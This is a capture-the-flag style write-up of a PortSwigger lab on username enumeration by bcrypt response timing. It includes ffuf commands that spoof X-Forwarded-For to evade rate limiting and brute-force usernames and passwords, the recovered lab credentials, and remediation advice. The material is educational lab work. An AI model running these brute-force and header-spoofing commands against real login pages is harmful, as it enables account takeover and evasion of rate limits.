# Username Enumeration via Response Timing - PortSwigger Lab 15

**Severity:** Medium
**Target:** https://0a15005f0379d3f28046854f002000f3.web-security-academy.net

## Summary
The server processes bcrypt when the parameter is a valid username. If not, it rejects early. that asymmetry leaks timing information. it's a behavior from bcrypt when poorly protected.

## Vulnerability Details
**Type:** enumeration via response timing 
**Root Cause:** bcrypt timing side-channel, poorly mitigated
**Endpoint:** https://0a15005f0379d3f28046854f002000f3.web-security-academy.net/login

## Steps to Reproduce
1. Test the X-Forwarded-For header manually to verify the server accepts forged IPs without validation
2. After confirming, brute-force with a long password to check the timing response, make sure to make the password as long as u can for better results (A long password amplifies bcrypt processing time, increasing the difference between valid and invalid usernames and making outliers detectable even with network variations.)
3. Analyze response times and identify outliers
4. After identifying the valid username via timing. brute-force the password

## Proof of Concept

```bash
ffuf -w /home/luweed/Documents/wordusers.txt:FUZZ \
     -w /home/luweed/Documents/ips.txt:FUZZ2 \
     -mode pitchfork \
     -u https://0a15005f0379d3f28046854f002000f3.web-security-academy.net/login \
     -X POST \
     -d "username=FUZZ&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ2" \
     -v 
```

The response time was more than double that of the others, exceeding 400ms compared to the other range of 250ms.


```bash
ffuf -w /home/luweed/Documents/rockpass.txt:FUZZ \
     -w /home/luweed/Documents/ips.txt:FUZZ2 \
     -mode pitchfork \
     -u https://0a15005f0379d3f28046854f002000f3.web-security-academy.net/login \
     -X POST \
     -d "username=as&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ2" \
     -fc 200
```


final_output: `` [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 253ms]
    * FUZZ: daniel
    * FUZZ2: 1.1.1.54
``


## Result
``as:daniel``


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Implement constant-time comparison for authentication responses regardless of username validity. 
Additionally, validate and strip the X-Forwarded-For header or implement rate limiting based on session or token, not IP.
